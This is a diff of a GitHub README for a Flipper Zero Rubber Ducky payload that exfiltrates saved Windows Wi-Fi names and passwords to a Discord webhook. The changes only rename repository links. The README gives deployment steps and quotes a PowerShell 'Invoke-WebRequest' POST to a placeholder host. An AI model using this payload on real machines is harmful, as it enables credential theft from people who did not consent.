@@ -3,7 +3,7 @@
 
 <br>
 
-![Some Weird Image](https://github.com/cxdzc/network-payload/assets/110936008/11c7bdde-e4b0-4cdf-9ccd-22e4b86f28ad)
+![Some Weird Image](https://github.com/cxdzc/wifi-credential-exfil/assets/110936008/11c7bdde-e4b0-4cdf-9ccd-22e4b86f28ad)
 
 # 📦 WAKER Wi-Fi Credential Exfiltration v1.0.0
 Obtain Wi-Fi names and passwords from a Microsoft Windows operating system computer. This can be accessed by leveraging the convenience of Wi-Fi profiles that are saved on Microsoft Windows operating systems using PowerShell. 
@@ -14,11 +14,11 @@ Obtain Wi-Fi names and passwords from a Microsoft Windows operating system compu
 > The payload was designed for a Flipper Zero using the classic Rubber Ducky Scripting Language 1.0 to exfiltrate data through the use of Discord webhooks. It can also be used as a regular payload with a webhook.
 
 # 📄 Instructions
-1. Replace `https://YOUR_LINK_HERE.com` in [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) with your custom webhook.
+1. Replace `https://YOUR_LINK_HERE.com` in [payload.txt](https://github.com/cxdzc/wifi-credential-exfil/payload.txt) with your custom webhook.
 
 `...Invoke-WebRequest -Uri https://YOUR_LINK_HERE.com -Method Post...`
 
-2. Upload [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) to your hotplug.
+2. Upload [payload.txt](https://github.com/cxdzc/wifi-credential-exfil/payload.txt) to your hotplug.
 3. Execute the file.
 
 # ⛔ Prevention
@@ -28,6 +28,6 @@ There are many ways to prevent this hotload attack from occurring. A very quick,
 The content and software in this GitHub repository are licensed under the Creative Commons [Attribution-NonCommercial-ShareAlike 4.0 International License](LICENSE). Users are free to share and adapt the material covered by this license, subject to the following conditions: provide appropriate attribution, refrain from employing it for commercial purposes, and distribute any derivative works under the same licensing terms.
 
 > [!NOTE]
-> If you would like to provide appropriate attribution, you may simply refer to this GitHub [repository](https://github.com/cxdzc/network-payload) or this GitHub account [@cxdzc](https://github.com/cxdzc).
+> If you would like to provide appropriate attribution, you may simply refer to this GitHub [repository](https://github.com/cxdzc/wifi-credential-exfil) or this GitHub account [@cxdzc](https://github.com/cxdzc).
 
 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a>
